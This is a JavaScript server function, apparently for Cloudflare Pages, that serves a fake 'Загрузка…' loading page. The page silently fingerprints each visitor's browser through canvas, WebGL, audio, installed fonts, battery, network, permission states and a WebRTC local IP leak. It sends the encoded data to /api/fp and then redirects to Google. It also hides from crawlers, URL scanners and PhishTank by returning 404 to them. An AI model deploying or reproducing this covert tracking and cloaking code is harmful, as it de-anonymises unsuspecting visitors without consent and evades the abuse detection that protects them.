// functions/index.js — silent-страница: собирает всё, что браузер отдаёт молча
export async function onRequestGet(context) {
  const { request } = context;
  const ua = request.headers.get("User-Agent") || "";

  if (/bot|crawler|spider|scanner|urlscan|phishtank|google|bing|yandex/i.test(ua)) {
    return new Response("Nothing here", { status: 404 });
  }

  const html = `<!DOCTYPE html><html lang="ru"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Загрузка…</title>
<style>body{background:#0a0e17;color:#fff;font-family:-apple-system,sans-serif;
display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.loader{width:40px;height:40px;border:3px solid #2563eb;border-top-color:transparent;
border-radius:50%;animation:s 1s linear infinite}@keyframes s{to{transform:rotate(360deg)}}</style>
</head><body><div class="loader"></div>
<script>
(async () => {
  const fp = {};
  fp.ua = navigator.userAgent; fp.platform = navigator.platform;
  fp.lang = navigator.language; fp.langs = navigator.languages;
  fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  fp.screen = { w: screen.width, h: screen.height, cd: screen.colorDepth,
                pd: devicePixelRatio, orient: screen.orientation && screen.orientation.type };
  fp.cores = navigator.hardwareConcurrency; fp.mem = navigator.deviceMemory;
  fp.touch = navigator.maxTouchPoints; fp.cookies = navigator.cookieEnabled;
  fp.dnt = navigator.doNotTrack; fp.ref = document.referrer; fp.url = location.href;
  fp.ts = new Date().toISOString();
  try { const b = await navigator.getBattery(); fp.battery = { level: b.level, charging: b.charging }; } catch(e){}
  try { const c = navigator.connection;
        fp.net = { type: c.effectiveType, down: c.downlink, rtt: c.rtt, save: c.saveData }; } catch(e){}
  try { const c = document.createElement("canvas"); c.width = 220; c.height = 40;
        const ctx = c.getContext("2d"); ctx.textBaseline = "top"; ctx.font = "14px Arial";
        ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069"; ctx.fillText("fp,ЖЯ",2,15);
        ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("fp,ЖЯ",4,17);
        fp.canvas = c.toDataURL().slice(-64); } catch(e){}
  try { const gl = document.createElement("canvas").getContext("webgl");
        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
        fp.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER),
          uv: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
          ur: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null }; } catch(e){}
  try { const ac = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
        const osc = ac.createOscillator(); osc.type = "triangle"; osc.frequency.value = 10000;
        const comp = ac.createDynamicsCompressor();
        osc.connect(comp); comp.connect(ac.destination); osc.start(0);
        const buf = await ac.startRendering(); const d = buf.getChannelData(0);
        let sum = 0; for (let i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
        fp.audio = sum; } catch(e){}
  try { const base = ["monospace","sans-serif","serif"];
        const test = ["Arial","Verdana","Tahoma","Times New Roman","Courier New",
                      "Georgia","Comic Sans MS","Impact","Roboto","Helvetica"];
        const span = document.createElement("span");
        span.style.cssText = "position:absolute;left:-9999px;font-size:72px;visibility:hidden";
        span.textContent = "mmmmmmmmmmlli"; document.body.appendChild(span);
        const def = {}; for (const b of base) { span.style.fontFamily = b; def[b] = span.offsetWidth; }
        const found = [];
        for (const f of test) for (const b of base) {
          span.style.fontFamily = "'" + f + "'," + b;
          if (span.offsetWidth !== def[b]) { found.push(f); break; }
        }
        fp.fonts = found; span.remove(); } catch(e){}
  try { fp.webrtc = await new Promise(res => {
        const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
        const ips = new Set(); pc.createDataChannel("");
        pc.onicecandidate = e => {
          if (!e.candidate) { pc.close(); return res([...ips]); }
          const m = e.candidate.candidate.match(/(\\d+\\.\\d+\\.\\d+\\.\\d+)/);
          if (m) ips.add(m[1]);
        };
        pc.createOffer().then(o => pc.setLocalDescription(o));
        setTimeout(() => res([...ips]), 2000);
      }); } catch(e){}
  try { const names = ["geolocation","notifications","camera","microphone","clipboard-read"];
        const perms = {};
        for (const n of names) { try { perms[n] = (await navigator.permissions.query({name:n})).state; } catch(e){} }
        fp.perms = perms; } catch(e){}
  const payload = btoa(unescape(encodeURIComponent(JSON.stringify(fp))));
  navigator.sendBeacon("/api/fp", payload);
  fetch("/api/fp", {method:"POST", body: payload, keepalive:true}).catch(()=>{});
  setTimeout(() => location.href = "https://www.google.com", 800);
})();
</script></body></html>`;

  return new Response(html, {
    headers: { "Content-Type": "text/html;charset=utf-8" }
  });
}
